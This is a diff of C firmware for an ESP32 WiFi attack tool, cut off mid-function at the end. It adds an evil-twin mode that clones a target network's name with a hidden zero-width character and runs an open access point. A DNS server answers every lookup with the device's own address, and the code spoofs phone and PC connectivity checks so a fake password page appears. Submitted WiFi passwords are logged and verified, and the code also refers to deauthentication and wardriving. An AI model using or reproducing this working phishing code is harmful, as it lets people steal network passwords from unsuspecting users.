+            }
+            
+            // Stop DHCP server to configure custom IP
+            esp_netif_dhcps_stop(ap_netif);
+            
+            // Set static IP 172.0.0.1 for AP
+            esp_netif_ip_info_t ip_info;
+            ip_info.ip.addr = esp_ip4addr_aton("172.0.0.1");
+            ip_info.gw.addr = esp_ip4addr_aton("172.0.0.1");
+            ip_info.netmask.addr = esp_ip4addr_aton("255.255.255.0");
+            
+            esp_err_t             ret = esp_netif_set_ip_info(ap_netif, &ip_info);
+            if (ret != ESP_OK) {
+                MY_LOG_INFO(TAG, "Failed to set AP IP: %s", esp_err_to_name(ret));
+                applicationState = IDLE;
+                return 1;
+            }
+            
+            // Configure AP with Evil Twin SSID
+            wifi_config_t ap_config = {
+                .ap = {
+                    .ssid = "",
+                    .ssid_len = 0,
+                    .channel = 1,
+                    .password = "",
+                    .max_connection = 4,
+                    .authmode = WIFI_AUTH_OPEN
+                }
+            };
+            
+            // Copy original SSID and add Zero Width Space (U+200B) at the end
+            // This prevents iPhone from grouping original and twin networks together
+            size_t ssid_len = strlen(evilTwinSSID);
+            if (ssid_len + 3 <= sizeof(ap_config.ap.ssid)) {
+                // Copy original SSID
+                strncpy((char*)ap_config.ap.ssid, evilTwinSSID, sizeof(ap_config.ap.ssid));
+                // Add Zero Width Space (UTF-8: 0xE2 0x80 0x8B)
+                ap_config.ap.ssid[ssid_len] = 0xE2;
+                ap_config.ap.ssid[ssid_len + 1] = 0x80;
+                ap_config.ap.ssid[ssid_len + 2] = 0x8B;
+                ap_config.ap.ssid_len = ssid_len + 3;
+            } else {
+                // SSID too long, just copy without Zero Width Space
+                strncpy((char*)ap_config.ap.ssid, evilTwinSSID, sizeof(ap_config.ap.ssid));
+                ap_config.ap.ssid_len = strlen(evilTwinSSID);
+            }
+            
+            // WiFi is already running in APSTA mode from wifi_init_ap_sta()
+            // Just update the AP configuration
+            ret = esp_wifi_set_config(WIFI_IF_AP, &ap_config);
+            if (ret != ESP_OK) {
+                MY_LOG_INFO(TAG, "Failed to set AP config: %s", esp_err_to_name(ret));
+                applicationState = IDLE;
+                return 1;
+            }
+            
+            // Start DHCP server
+            ret = esp_netif_dhcps_start(ap_netif);
+            if (ret != ESP_OK) {
+                MY_LOG_INFO(TAG, "Failed to start DHCP server: %s", esp_err_to_name(ret));
+                applicationState = IDLE;
+                return 1;
+            }
+            
+            // Wait a bit for AP to fully start
+            vTaskDelay(pdMS_TO_TICKS(1000));
+            
+            // Configure HTTP server
+            httpd_config_t config = HTTPD_DEFAULT_CONFIG();
+            config.server_port = 80;
+            config.max_open_sockets = 7;
+            
+            // Start HTTP server
+            esp_err_t http_ret = httpd_start(&portal_server, &config);
+            if (http_ret != ESP_OK) {
+                MY_LOG_INFO(TAG, "Failed to start HTTP server: %s", esp_err_to_name(http_ret));
+                // Stop DHCP before returning
+                esp_netif_dhcps_stop(ap_netif);
+                applicationState = IDLE;
+                return 1;
+            }
+            
+            // Register URI handlers
+            httpd_uri_t root_uri = {
+                .uri = "/",
+                .method = HTTP_GET,
+                .handler = root_handler,
+                .user_ctx = NULL
+            };
+            httpd_register_uri_handler(portal_server, &root_uri);
+            
+            httpd_uri_t root_post_uri = {
+                .uri = "/",
+                .method = HTTP_POST,
+                .handler = root_handler,
+                .user_ctx = NULL
+            };
+            httpd_register_uri_handler(portal_server, &root_post_uri);
+            
+            httpd_uri_t portal_uri = {
+                .uri = "/portal",
+                .method = HTTP_GET,
+                .handler = portal_handler,
+                .user_ctx = NULL
+            };
+            httpd_register_uri_handler(portal_server, &portal_uri);
+            
+            httpd_uri_t login_uri = {
+                .uri = "/login",
+                .method = HTTP_POST,
+                .handler = login_handler,
+                .user_ctx = NULL
+            };
+            httpd_register_uri_handler(portal_server, &login_uri);
+            
+            httpd_uri_t android_captive_uri = {
+                .uri = "/generate_204",
+                .method = HTTP_GET,
+                .handler = android_captive_handler,
+                .user_ctx = NULL
+            };
+            httpd_register_uri_handler(portal_server, &android_captive_uri);
+            
+            httpd_uri_t ios_captive_uri = {
+                .uri = "/hotspot-detect.html",
+                .method = HTTP_GET,
+                .handler = ios_captive_handler,
+                .user_ctx = NULL
+            };
+            httpd_register_uri_handler(portal_server, &ios_captive_uri);
+            
+            httpd_uri_t samsung_captive_uri = {
+                .uri = "/ncsi.txt",
+                .method = HTTP_GET,
+                .handler = captive_detection_handler,
+                .user_ctx = NULL
+            };
+            httpd_register_uri_handler(portal_server, &samsung_captive_uri);
+            
+            httpd_uri_t windows_captive_uri = {
+                .uri = "/connecttest.txt",
+                .method = HTTP_GET,
+                .handler = captive_detection_handler,
+                .user_ctx = NULL
+            };
+            httpd_register_uri_handler(portal_server, &windows_captive_uri);
+            
+            // Set portal_active flag BEFORE starting DNS task
+            // (DNS task checks this flag in its loop)
+            portal_active = true;
+            
+            // Start DNS server task
+            BaseType_t dns_result = xTaskCreate(
+                dns_server_task,
+                "dns_server",
+                4096,
+                NULL,
+                5,
+                &dns_server_task_handle
+            );
+            
+            if (dns_result != pdPASS) {
+                MY_LOG_INFO(TAG, "Failed to create DNS server task");
+                httpd_stop(portal_server);
+                portal_server = NULL;
+                portal_active = false;
+                applicationState = IDLE;
+                return 1;
+            }
+            
+            MY_LOG_INFO(TAG, "Captive portal started successfully");
         }
-
 
         MY_LOG_INFO(TAG,"Attacking %d network(s):", g_selected_count);
-        for (int i = 0; i < g_selected_count; ++i) {
-            int idx = g_selected_indices[i];
-            wifi_ap_record_t *ap = &g_scan_results[idx];
-            MY_LOG_INFO(TAG,"  [%d] SSID='%s' Ch=%d RSSI=%d", idx, (const char*)ap->ssid, ap->primary, ap->rssi);
-        }
         
         // Save target BSSIDs for channel monitoring
         save_target_bssids();
@@ -1475,6 +1876,57 @@ static int cmd_stop(int argc, char **argv) {
             wardrive_task_handle = NULL;
             MY_LOG_INFO(TAG, "Wardrive task forcefully stopped.");
         }
+    }
+    
+    // Stop portal if active
+    if (portal_active) {
+        MY_LOG_INFO(TAG, "Stopping portal...");
+        portal_active = false;
+        
+        // Stop DNS server task
+        if (dns_server_task_handle != NULL) {
+            MY_LOG_INFO(TAG, "Stopping DNS server task...");
+            
+            // Wait for DNS task to finish (it checks portal_active flag)
+            for (int i = 0; i < 30 && dns_server_task_handle != NULL; i++) {
+                vTaskDelay(pdMS_TO_TICKS(100));
+            }
+            
+            // Force cleanup if still running
+            if (dns_server_task_handle != NULL) {
+                vTaskDelete(dns_server_task_handle);
+                dns_server_task_handle = NULL;
+                if (dns_server_socket >= 0) {
+                    close(dns_server_socket);
+                    dns_server_socket = -1;
+                }
+                MY_LOG_INFO(TAG, "DNS server task forcefully stopped.");
+            } else {
+                MY_LOG_INFO(TAG, "DNS server task stopped.");
+            }
+        }
+        
+        // Stop HTTP server
+        if (portal_server != NULL) {
+            httpd_stop(portal_server);
+            portal_server = NULL;
+            MY_LOG_INFO(TAG, "HTTP server stopped.");
+        }
+        
+        // Stop DHCP server
+        esp_netif_t *ap_netif = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
+        if (ap_netif) {
+            esp_err_t dhcp_ret = esp_netif_dhcps_stop(ap_netif);
+            if (dhcp_ret != ESP_OK) {
+                MY_LOG_INFO(TAG, "Failed to stop DHCP server: %s", esp_err_to_name(dhcp_ret));
+            } else {
+                MY_LOG_INFO(TAG, "DHCP server stopped.");
+            }
+        }
+        
+        // Stop AP mode
+        esp_wifi_stop();
+        MY_LOG_INFO(TAG, "Portal stopped.");
     }
     
     // Clear LED (ignore errors if LED is in invalid state)
@@ -1671,6 +2123,148 @@ static int cmd_reboot(int argc, char **argv)
     MY_LOG_INFO(TAG,"Restart...");
     vTaskDelay(pdMS_TO_TICKS(100));
     esp_restart();
+    return 0;
+}
+
+// Command: list_sd - Lists HTML files on SD card
+static int cmd_list_sd(int argc, char **argv)
+{
+    (void)argc; (void)argv;
+    
+    // Initialize SD card if not already mounted
+    esp_err_t ret = init_sd_card();
+    if (ret != ESP_OK) {
+        MY_LOG_INFO(TAG, "Failed to initialize SD card: %s", esp_err_to_name(ret));
+        MY_LOG_INFO(TAG, "Make sure SD card is properly inserted.");
+        return 1;
+    }
+    
+    DIR *dir = opendir("/sdcard");
+    if (dir == NULL) {
+        MY_LOG_INFO(TAG, "Failed to open /sdcard directory. Error: %d (%s)", errno, strerror(errno));
+        return 1;
+    }
+    
+    sd_html_count = 0;
+    struct dirent *entry;
+    
+    while ((entry = readdir(dir)) != NULL && sd_html_count < MAX_HTML_FILES) {
+        // Skip directories and special entries
+        if (entry->d_type == DT_DIR) {
+            continue;
+        }
+        
+        // Skip macOS metadata files (._filename or _filename in MS-DOS 8.3)
+        if (entry->d_name[0] == '.' || entry->d_name[0] == '_') {
+            continue;
+        }
+        
+        // Check if file ends with .html or .htm (case insensitive)
+        size_t len = strlen(entry->d_name);
+        bool is_html = false;
+        
+        if (len > 5) {
+            const char *ext = entry->d_name + len - 5;
+            if (strcasecmp(ext, ".html") == 0) {
+                is_html = true;
+            }
+        }
+        
+        if (!is_html && len > 4) {
+            const char *ext = entry->d_name + len - 4;
+            if (strcasecmp(ext, ".htm") == 0) {
+                is_html = true;
+            }
+        }
+        
+        if (is_html) {
+            strncpy(sd_html_files[sd_html_count], entry->d_name, MAX_HTML_FILENAME - 1);
+            sd_html_files[sd_html_count][MAX_HTML_FILENAME - 1] = '\0';
+            sd_html_count++;
+        }
+    }
+    
+    closedir(dir);
+    
+    if (sd_html_count == 0) {
+        MY_LOG_INFO(TAG, "No HTML files found on SD card.");
+        return 0;
+    }
+    
+    MY_LOG_INFO(TAG, "HTML files found on SD card:");
+    for (int i = 0; i < sd_html_count; i++) {
+        printf("%d %s\n", i + 1, sd_html_files[i]);
+    }
+    
+    return 0;
+}
+
+// Command: select_html [index] - Loads HTML file from SD card
+static int cmd_select_html(int argc, char **argv)
+{
+    if (argc < 2) {
+        MY_LOG_INFO(TAG, "Usage: select_html <index>");
+        MY_LOG_INFO(TAG, "Run list_sd first to see available HTML files.");
+        return 1;
+    }
+    
+    int index = atoi(argv[1]) - 1; // Convert from 1-based to 0-based
+    
+    if (index < 0 || index >= sd_html_count) {
+        MY_LOG_INFO(TAG, "Invalid index. Run list_sd to see available files.");
+        return 1;
+    }
+    
+    // Initialize SD card if not already mounted
+    esp_err_t ret = init_sd_card();
+    if (ret != ESP_OK) {
+        MY_LOG_INFO(TAG, "Failed to initialize SD card: %s", esp_err_to_name(ret));
+        MY_LOG_INFO(TAG, "Make sure SD card is properly inserted.");
+        return 1;
+    }
+    
+    char filepath[128];
+    snprintf(filepath, sizeof(filepath), "/sdcard/%s", sd_html_files[index]);
+    
+    // Open file and get size
+    FILE *f = fopen(filepath, "r");
+    if (f == NULL) {
+        MY_LOG_INFO(TAG, "Failed to open file: %s", filepath);
+        return 1;
+    }
+    
+    // Get file size
+    fseek(f, 0, SEEK_END);
+    long fsize = ftell(f);
+    fseek(f, 0, SEEK_SET);
+    
+    if (fsize <= 0 || fsize > 100000) { // Limit to 100KB
+        MY_LOG_INFO(TAG, "File size invalid or too large: %ld bytes", fsize);
+        fclose(f);
+        return 1;
+    }
+    
+    // Free previous custom HTML if exists
+    if (custom_portal_html != NULL) {
+        free(custom_portal_html);
+        custom_portal_html = NULL;
+    }
+    
+    // Allocate memory and read file
+    custom_portal_html = (char*)malloc(fsize + 1);
+    if (custom_portal_html == NULL) {
+        MY_LOG_INFO(TAG, "Failed to allocate memory for HTML file.");
+        fclose(f);
+        return 1;
+    }
+    
+    size_t bytes_read = fread(custom_portal_html, 1, fsize, f);
+    custom_portal_html[bytes_read] = '\0';
+    fclose(f);
+    
+    MY_LOG_INFO(TAG, "Loaded HTML file: %s (%u bytes)", sd_html_files[index], (unsigned int)bytes_read);
+    MY_LOG_INFO(TAG, "Portal will now use this custom HTML.");
+    
     return 0;
 }
 
@@ -1932,6 +2526,656 @@ static int cmd_start_wardrive(int argc, char **argv) {
     return 0;
 }
 
+// HTML form for password input (default)
+static const char* default_portal_html = 
+"<!DOCTYPE html>"
+"<html>"
+"<head>"
+"<meta charset='UTF-8'>"
+"<meta name='viewport' content='width=device-width, initial-scale=1.0'>"
+"<title>Portal Access</title>"
+"<style>"
+"body { font-family: Arial, sans-serif; background: #f0f0f0; margin: 0; padding: 20px; }"
+".container { max-width: 400px; margin: 50px auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }"
+"h1 { text-align: center; color: #333; margin-bottom: 30px; }"
+"form { display: flex; flex-direction: column; }"
+"input[type='password'] { padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px; font-size: 16px; }"
+"button { padding: 12px; background: #007bff; color: white; border: none; border-radius: 5px; font-size: 16px; cursor: pointer; margin-top: 10px; }"
+"button:hover { background: #0056b3; }"
+"</style>"
+"<script>"
+"// Auto-redirect for captive portal detection"
+"if (window.location.hostname !== '172.0.0.1') {"
+"    window.location.href = 'http://172.0.0.1/';"
+"}"
+"</script>"
+"</head>"
+"<body>"
+"<div class='container'>"
+"<h1>Portal Access</h1>"
+"<form method='POST' action='/login'>"
+"<input type='password' name='password' placeholder='Enter password' required>"
+"<button type='submit'>Log in</button>"
+"</form>"
+"</div>"
+"</body>"
+"</html>";
+
+// HTTP handler for login form
+static esp_err_t login_handler(httpd_req_t *req) {
+    MY_LOG_INFO(TAG, "Login handler called - URI: %s, Method: %s", req->uri, req->method == HTTP_POST ? "POST" : "GET");
+    MY_LOG_INFO(TAG, "Login handler called - processing password!");
+    
+    char buf[256];
+    int ret = httpd_req_recv(req, buf, sizeof(buf) - 1);
+    if (ret <= 0) {
+        MY_LOG_INFO(TAG, "Failed to receive POST data");
+        return ESP_FAIL;
+    }
+    buf[ret] = '\0';
+    
+    MY_LOG_INFO(TAG, "Received POST data: %s", buf);
+    
+    // Parse password from POST data
+    char *password_start = strstr(buf, "password=");
+    if (password_start) {
+        password_start += 9; // Skip "password="
+        char *password_end = strchr(password_start, '&');
+        if (password_end) {
+            *password_end = '\0';
+        }
+        
+        // URL decode the password
+        char decoded_password[64];
+        int decoded_len = 0;
+        for (char *p = password_start; *p && decoded_len < sizeof(decoded_password) - 1; p++) {
+            if (*p == '%' && p[1] && p[2]) {
+                char hex[3] = {p[1], p[2], '\0'};
+                decoded_password[decoded_len++] = (char)strtol(hex, NULL, 16);
+                p += 2;
+            } else if (*p == '+') {
+                decoded_password[decoded_len++] = ' ';
+            } else {
+                decoded_password[decoded_len++] = *p;
+            }
+        }
+        decoded_password[decoded_len] = '\0';
+        
+        // Log the password
+        MY_LOG_INFO(TAG, "Portal password received: %s", decoded_password);
+        
+        // If in evil twin mode, verify the password
+        if (applicationState == DEAUTH_EVIL_TWIN && evilTwinSSID != NULL) {
+            verify_password(decoded_password);
+        }
+    }
+    
+    // Send response based on previous password attempt result
+    const char* response;
+    if (last_password_wrong) {
+        // Show "Wrong Password" message
+        response = 
+            "<!DOCTYPE html><html><head>"
+            "<meta charset='UTF-8'>"
+            "<meta name='viewport' content='width=device-width, initial-scale=1.0'>"
+            "<title>Wrong Password</title>"
+            "<style>"
+            "body { font-family: Arial, sans-serif; background: #f0f0f0; margin: 0; padding: 20px; }"
+            ".container { max-width: 400px; margin: 50px auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }"
+            "h1 { text-align: center; color: #d32f2f; margin-bottom: 20px; }"
+            "p { text-align: center; color: #666; }"
+            "a { display: block; text-align: center; margin-top: 20px; padding: 12px; background: #007bff; color: white; text-decoration: none; border-radius: 5px; }"
+            "a:hover { background: #0056b3; }"
+            "</style>"
+            "</head>"
+            "<body>"
+            "<div class='container'>"
+            "<h1>Wrong Password</h1>"
+            "<p>The password you entered is incorrect. Please try again.</p>"
+            "<a href='/portal'>Try Again</a>"
+            "</div>"
+            "</body></html>";
+    } else {
+        // Show "Processing" message
+        response = 
+            "<!DOCTYPE html><html><head>"
+            "<meta charset='UTF-8'>"
+            "<meta name='viewport' content='width=device-width, initial-scale=1.0'>"
+            "<title>Processing</title>"
+            "<style>"
+            "body { font-family: Arial, sans-serif; background: #f0f0f0; margin: 0; padding: 20px; }"
+            ".container { max-width: 400px; margin: 50px auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }"
+            "h1 { text-align: center; color: #007bff; margin-bottom: 20px; }"
+            "p { text-align: center; color: #666; }"
+            ".spinner { margin: 20px auto; width: 50px; height: 50px; border: 5px solid #f3f3f3; border-top: 5px solid #007bff; border-radius: 50%; animation: spin 1s linear infinite; }"
+            "@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }"
+            "</style>"
+            "</head>"
+            "<body>"
+            "<div class='container'>"
+            "<h1>Verifying...</h1>"
+            "<div class='spinner'></div>"
+            "<p>Please wait while we verify your credentials.</p>"
+            "</div>"
+            "</body></html>";
+    }
+    
+    httpd_resp_send(req, response, HTTPD_RESP_USE_STRLEN);
+    return ESP_OK;
+}
+
+// HTTP handler for portal page
+static esp_err_t portal_handler(httpd_req_t *req) {
+    MY_LOG_INFO(TAG, "Portal page accessed: %s, Method: %s", req->uri, req->method == HTTP_GET ? "GET" : "POST");
+    MY_LOG_INFO(TAG, "Portal handler called - serving portal page!");
+    httpd_resp_set_type(req, "text/html");
+    const char* portal_html = custom_portal_html ? custom_portal_html : default_portal_html;
+    httpd_resp_send(req, portal_html, HTTPD_RESP_USE_STRLEN);
+    return ESP_OK;
+}
+
+// URI handler for captive portal redirection
+static esp_err_t captive_portal_handler(httpd_req_t *req) {
+    MY_LOG_INFO(TAG, "Captive portal redirect triggered for: %s, Method: %s", req->uri, req->method == HTTP_GET ? "GET" : "POST");
+    MY_LOG_INFO(TAG, "Catch-all handler called - redirecting to portal!");
+    
+    // Log client IP (simplified - just log that we received a request)
+    MY_LOG_INFO(TAG, "HTTP request received from client");
+    
+    // Redirect all requests to our portal page
+    httpd_resp_set_status(req, "302 Found");
+    httpd_resp_set_hdr(req, "Location", "/portal");
+    httpd_resp_send(req, NULL, 0);
+    return ESP_OK;
+}
+
+// Handler for root path - most devices try to access this first
+static esp_err_t root_handler(httpd_req_t *req) {
+    MY_LOG_INFO(TAG, "Root path accessed: %s, Method: %s", req->uri, req->method == HTTP_GET ? "GET" : "POST");
+    
+    // Log client IP (simplified - just log that we received a request)
+    MY_LOG_INFO(TAG, "HTTP request received from client");
+    
+    // Add captive portal headers for Android/Samsung detection
+    httpd_resp_set_hdr(req, "Cache-Control", "no-cache, no-store, must-revalidate");
+    httpd_resp_set_hdr(req, "Pragma", "no-cache");
+    httpd_resp_set_hdr(req, "Expires", "0");
+    httpd_resp_set_hdr(req, "Connection", "close");
+    httpd_resp_set_hdr(req, "Content-Type", "text/html; charset=utf-8");
+    
+    // Always return the portal HTML with password form
+    httpd_resp_set_type(req, "text/html");
+    const char* portal_html = custom_portal_html ? custom_portal_html : default_portal_html;
+    httpd_resp_send(req, portal_html, HTTPD_RESP_USE_STRLEN);
+    return ESP_OK;
+}
+
+// Handler for Android captive portal detection (generate_204)
+static esp_err_t android_captive_handler(httpd_req_t *req) {
+    MY_LOG_INFO(TAG, "Android captive portal detection: %s", req->uri);
+    MY_LOG_INFO(TAG, "Android handler called - this means client is trying to detect captive portal!");
+    
+    // Android expects a 204 No Content response for captive portal detection
+    // If we return 204, Android thinks internet works
+    // If we return 200 with HTML, Android thinks it's a captive portal
+    // So we return 200 with our portal HTML to trigger captive portal
+    httpd_resp_set_status(req, "200 OK");
+    httpd_resp_set_hdr(req, "Cache-Control", "no-cache, no-store, must-revalidate");
+    httpd_resp_set_hdr(req, "Pragma", "no-cache");
+    httpd_resp_set_hdr(req, "Expires", "0");
+    httpd_resp_set_hdr(req, "Content-Type", "text/html");
+    
+    // Send our portal HTML to trigger captive portal
+    const char* portal_html = custom_portal_html ? custom_portal_html : default_portal_html;
+    httpd_resp_send(req, portal_html, HTTPD_RESP_USE_STRLEN);
+    return ESP_OK;
+}
+
+// Handler for iOS captive portal detection (hotspot-detect.html)
+static esp_err_t ios_captive_handler(httpd_req_t *req) {
+    MY_LOG_INFO(TAG, "iOS captive portal detection: %s", req->uri);
+    MY_LOG_INFO(TAG, "iOS handler called - this means client is trying to detect captive portal!");
+    
+    // iOS detects captive portal when this endpoint returns something other than "Success"
+    // So we return our portal HTML with password form to trigger captive portal popup
+    httpd_resp_set_status(req, "200 OK");
+    httpd_resp_set_hdr(req, "Cache-Control", "no-cache, no-store, must-revalidate");
+    httpd_resp_set_hdr(req, "Pragma", "no-cache");
+    httpd_resp_set_hdr(req, "Expires", "0");
+    httpd_resp_set_hdr(req, "Content-Type", "text/html");
+    
+    // Send our portal HTML to show password form
+    const char* portal_html = custom_portal_html ? custom_portal_html : default_portal_html;
+    httpd_resp_send(req, portal_html, HTTPD_RESP_USE_STRLEN);
+    return ESP_OK;
+}
+
+// Handler for common captive portal detection endpoints
+static esp_err_t captive_detection_handler(httpd_req_t *req) {
+    MY_LOG_INFO(TAG, "Captive portal detection endpoint accessed: %s, Method: %s", req->uri, req->method == HTTP_GET ? "GET" : "POST");
+    
+    // Add captive portal headers
+    httpd_resp_set_hdr(req, "Cache-Control", "no-cache, no-store, must-revalidate");
+    httpd_resp_set_hdr(req, "Pragma", "no-cache");
+    httpd_resp_set_hdr(req, "Expires", "0");
+    httpd_resp_set_hdr(req, "Connection", "close");
+    
+    // Always return the portal HTML with password form
+    httpd_resp_set_type(req, "text/html");
+    const char* portal_html = custom_portal_html ? custom_portal_html : default_portal_html;
+    httpd_resp_send(req, portal_html, HTTPD_RESP_USE_STRLEN);
+    return ESP_OK;
+}
+
+// RFC 8908 Captive Portal API endpoint
+static esp_err_t captive_api_handler(httpd_req_t *req) {
+    MY_LOG_INFO(TAG, "RFC 8908 Captive Portal API handler called - URI: %s", req->uri);
+    
+    // Set CORS headers
+    httpd_resp_set_hdr(req, "Access-Control-Allow-Origin", "*");
+    httpd_resp_set_hdr(req, "Access-Control-Allow-Methods", "GET, POST, OPTIONS");
+    httpd_resp_set_hdr(req, "Access-Control-Allow-Headers", "Content-Type");
+    
+    // Handle preflight OPTIONS request
+    if (req->method == HTTP_OPTIONS) {
+        httpd_resp_set_status(req, "200 OK");
+        httpd_resp_set_type(req, "application/json");
+        httpd_resp_send(req, NULL, 0);
+        return ESP_OK;
+    }
+    
+    // RFC 8908 compliant JSON response
+    const char* json_response = 
+        "{"
+        "\"captive\": true,"
+        "\"user-portal-url\": \"http://172.0.0.1/portal\","
+        "\"venue-info-url\": \"http://172.0.0.1/portal\","
+        "\"is-portal\": true,"
+        "\"can-extend-session\": false,"
+        "\"seconds-remaining\": 0,"
+        "\"bytes-remaining\": 0"
+        "}";
+    
+    httpd_resp_set_status(req, "200 OK");
+    httpd_resp_set_type(req, "application/json");
+    httpd_resp_send(req, json_response, strlen(json_response));
+    
+    MY_LOG_INFO(TAG, "RFC 8908 API response sent: %s", json_response);
+    return ESP_OK;
+}
+
+// DNS server task for captive portal
+static void dns_server_task(void *pvParameters) {
+    (void)pvParameters;
+    
+    struct sockaddr_in server_addr;
+    struct sockaddr_in client_addr;
+    socklen_t client_addr_len = sizeof(client_addr);
+    char rx_buffer[DNS_MAX_PACKET_SIZE];
+    char tx_buffer[DNS_MAX_PACKET_SIZE];
+    
+    // Create UDP socket
+    dns_server_socket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
+    if (dns_server_socket < 0) {
+        MY_LOG_INFO(TAG, "Failed to create DNS socket: %d", errno);
+        dns_server_task_handle = NULL;
+        vTaskDelete(NULL);
+        return;
+    }
+    
+    // Bind to DNS port 53
+    memset(&server_addr, 0, sizeof(server_addr));
+    server_addr.sin_family = AF_INET;
+    server_addr.sin_addr.s_addr = htonl(INADDR_ANY);
+    server_addr.sin_port = htons(DNS_PORT);
+    
+    int err = bind(dns_server_socket, (struct sockaddr *)&server_addr, sizeof(server_addr));
+    if (err < 0) {
+        MY_LOG_INFO(TAG, "Failed to bind DNS socket: %d", errno);
+        close(dns_server_socket);
+        dns_server_socket = -1;
+        dns_server_task_handle = NULL;
+        vTaskDelete(NULL);
+        return;
+    }
+    
+    // Set socket timeout so we can check portal_active flag periodically
+    struct timeval timeout;
+    timeout.tv_sec = 1;
+    timeout.tv_usec = 0;
+    setsockopt(dns_server_socket, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));
+    
+    // Main DNS server loop
+    while (portal_active) {
+        int len = recvfrom(dns_server_socket, rx_buffer, sizeof(rx_buffer), 0,
+                          (struct sockaddr *)&client_addr, &client_addr_len);
+        
+        if (len < 0) {
+            if (errno == EAGAIN || errno == EWOULDBLOCK) {
+                // Timeout, check portal_active flag and continue
+                continue;
+            }
+            MY_LOG_INFO(TAG, "DNS recvfrom error: %d", errno);
+            break;
+        }
+        
+        if (len < 12) {
+            // DNS header is at least 12 bytes
+            continue;
+        }
+        
+        // Build DNS response
+        // Copy transaction ID and flags from request
+        memcpy(tx_buffer, rx_buffer, 2); // Transaction ID
+        
+        // Set flags: Response, Authoritative, No Error
+        tx_buffer[2] = 0x81; // QR=1 (response), Opcode=0, AA=0, TC=0, RD=0
+        tx_buffer[3] = 0x80; // RA=1, Z=0, RCODE=0 (no error)
+        
+        // Copy question count (should be 1)
+        tx_buffer[4] = rx_buffer[4];
+        tx_buffer[5] = rx_buffer[5];
+        
+        // Answer count = 1
+        tx_buffer[6] = 0x00;
+        tx_buffer[7] = 0x01;
+        
+        // Authority RRs = 0
+        tx_buffer[8] = 0x00;
+        tx_buffer[9] = 0x00;
+        
+        // Additional RRs = 0
+        tx_buffer[10] = 0x00;
+        tx_buffer[11] = 0x00;
+        
+        // Copy the question section from the request
+        int question_len = 0;
+        int pos = 12;
+        while (pos < len && rx_buffer[pos] != 0) {
+            pos += rx_buffer[pos] + 1;
+        }
+        pos++; // Skip final 0
+        pos += 4; // Skip QTYPE and QCLASS
+        question_len = pos - 12;
+        
+        if (question_len > 0 && question_len < (DNS_MAX_PACKET_SIZE - 12 - 16)) {
+            memcpy(tx_buffer + 12, rx_buffer + 12, question_len);
+            
+            // Add answer section
+            int answer_pos = 12 + question_len;
+            
+            // Name pointer to question (compression)
+            tx_buffer[answer_pos++] = 0xC0;
+            tx_buffer[answer_pos++] = 0x0C;
+            
+            // TYPE = A (0x0001)
+            tx_buffer[answer_pos++] = 0x00;
+            tx_buffer[answer_pos++] = 0x01;
+            
+            // CLASS = IN (0x0001)
+            tx_buffer[answer_pos++] = 0x00;
+            tx_buffer[answer_pos++] = 0x01;
+            
+            // TTL = 60 seconds
+            tx_buffer[answer_pos++] = 0x00;
+            tx_buffer[answer_pos++] = 0x00;
+            tx_buffer[answer_pos++] = 0x00;
+            tx_buffer[answer_pos++] = 0x3C;
+            
+            // Data length = 4 bytes
+            tx_buffer[answer_pos++] = 0x00;
+            tx_buffer[answer_pos++] = 0x04;
+            
+            // IP address: 172.0.0.1
+            tx_buffer[answer_pos++] = 172;
+            tx_buffer[answer_pos++] = 0;
+            tx_buffer[answer_pos++] = 0;
+            tx_buffer[answer_pos++] = 1;
+            
+            // Send response
+            sendto(dns_server_socket, tx_buffer, answer_pos, 0,
+                  (struct sockaddr *)&client_addr, client_addr_len);
+        }
+    }
+    
+    // Clean up
+    MY_LOG_INFO(TAG, "DNS server task stopping...");
+    close(dns_server_socket);
+    dns_server_socket = -1;
+    dns_server_task_handle = NULL;
+    vTaskDelete(NULL);
+}
+
+// Start portal command
+static int cmd_start_portal(int argc, char **argv) {
+    (void)argc; (void)argv;
+    
+    // Check if portal is already running
+    if (portal_active) {
+        MY_LOG_INFO(TAG, "Portal already running. Use 'stop' to stop it first.");
+        return 0;
+    }
+    
+    MY_LOG_INFO(TAG, "Starting captive portal...");
+    
+    // Get AP netif and stop DHCP to configure custom IP
+    esp_netif_t *ap_netif = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
+    if (!ap_netif) {
+        MY_LOG_INFO(TAG, "Failed to get AP netif");
+        return 1;
+    }
+    
+    // Stop DHCP server to configure custom IP
+    esp_netif_dhcps_stop(ap_netif);
+    
+    // Set static IP 172.0.0.1 for AP
+    esp_netif_ip_info_t ip_info;
+    ip_info.ip.addr = esp_ip4addr_aton("172.0.0.1");
+    ip_info.gw.addr = esp_ip4addr_aton("172.0.0.1");
+    ip_info.netmask.addr = esp_ip4addr_aton("255.255.255.0");
+    
+    esp_err_t ret = esp_netif_set_ip_info(ap_netif, &ip_info);
+    if (ret != ESP_OK) {
+        MY_LOG_INFO(TAG, "Failed to set AP IP: %s", esp_err_to_name(ret));
+        return 1;
+    }
+    
+    MY_LOG_INFO(TAG, "AP IP set to 172.0.0.1");
+    
+    // Configure AP
+    wifi_config_t ap_config = {
+        .ap = {
+            .ssid = "Portal",
+            .ssid_len = 6,
+            .channel = 1,
+            .password = "",
+            .max_connection = 4,
+            .authmode = WIFI_AUTH_OPEN
+        }
+    };
+    
+    // Start AP
+    ret = esp_wifi_set_mode(WIFI_MODE_AP);
+    if (ret != ESP_OK) {
+        MY_LOG_INFO(TAG, "Failed to set AP mode: %s", esp_err_to_name(ret));
+        return 1;
+    }
+    
+    ret = esp_wifi_set_config(WIFI_IF_AP, &ap_config);
+    if (ret != ESP_OK) {
+        MY_LOG_INFO(TAG, "Failed to set AP config: %s", esp_err_to_name(ret));
+        return 1;
+    }
+    
+    ret = esp_wifi_start();
+    if (ret != ESP_OK) {
+        MY_LOG_INFO(TAG, "Failed to start AP: %s", esp_err_to_name(ret));
+        return 1;
+    }
+    
+    // Start DHCP server
+    ret = esp_netif_dhcps_start(ap_netif);
+    if (ret != ESP_OK) {
+        MY_LOG_INFO(TAG, "Failed to start DHCP server: %s", esp_err_to_name(ret));
